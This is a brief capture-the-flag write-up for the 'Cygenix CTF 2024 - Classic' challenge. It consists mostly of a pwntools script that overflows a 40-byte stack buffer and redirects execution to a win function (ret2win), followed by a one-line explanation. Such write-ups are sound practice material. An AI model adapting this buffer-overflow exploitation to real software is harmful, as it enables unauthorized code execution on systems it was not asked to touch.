# Cygenix CTF 2024 - Classic


Every vulnerability is a door, and some doors lead to treasures.

<!--more-->

```python
#setup pwntools
from pwn import *
context(arch='amd64', os='linux')
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']

#setup binary
exe = ELF('./main')
p = process(exe.path)
#nc chall.ycfteam.in 3333
#p = remote('chall.ycfteam.in', 3333)
#p = gdb.debug(exe.path)

# Calculate the offset to the return address
offset = 40  # 32 bytes for the buffer + 8 bytes for saved RBP

# Find the address of the win function (replace with the correct function)
win_addr = exe.symbols['win']  # Assuming there's a win function

# Print the win function address
print("win function address: " + hex(win_addr))

# get the ret address
ret_addr = 0x40116C

context.log_level = 'debug'


# Craft the payload
payload = flat(
    b'A' * offset,  # Overflow buffer and overwrite RBP
    ret_addr,       # Overwrite return address with win() function address
    win_addr        # Overwrite return address with win() function address
)


# Print the payload
print(payload)

# Send the payload
p.sendline(payload)

# Interact with the program
p.interactive()
```

## Explanation

Simple ret2win, buffer overflow -> ret -> win -> remote shell

